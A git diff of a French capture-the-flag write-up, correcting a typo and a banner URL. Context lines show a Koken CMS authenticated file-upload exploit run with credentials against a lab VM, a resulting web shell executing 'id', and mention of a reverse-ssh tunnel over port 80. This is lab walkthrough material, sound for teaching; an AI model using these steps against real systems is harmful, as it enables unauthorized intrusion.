@@ -112,13 +112,13 @@ Petite auto-tape dans le dos puisque sur le précédent CTF j'avais codé un exp
 ```bash
 $ python3 koken_exploit.py http://192.168.242.128:8000/ daisa@photographer.com babygirl
 Koken CMS 0.22.24 - Arbitrary File Upload (Authenticated)
--- devloop.users.sf.net 2022 --
+-- devl00p.github.io 2022 --
 Successfully authenticated as daisa ahomi
 Enjoy your shell at http://192.168.242.128:8000//storage/originals/f6/70/eubfyyiektheoqhlbobx.php?cmd=id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
-Je rappatrie un reverse-ssh sur la VM. Le firewall semble filtrer des ports sortants mais ça fonctionne avec le port 80 (et sinon, les ports entrants de la VM ne sont pas filtrés).
+Je rapatrie un reverse-ssh sur la VM. Le firewall semble filtrer des ports sortants mais ça fonctionne avec le port 80 (et sinon, les ports entrants de la VM ne sont pas filtrés).
 
 Dans le dossier personnel de `daisa` se trouve le premier flag :
 
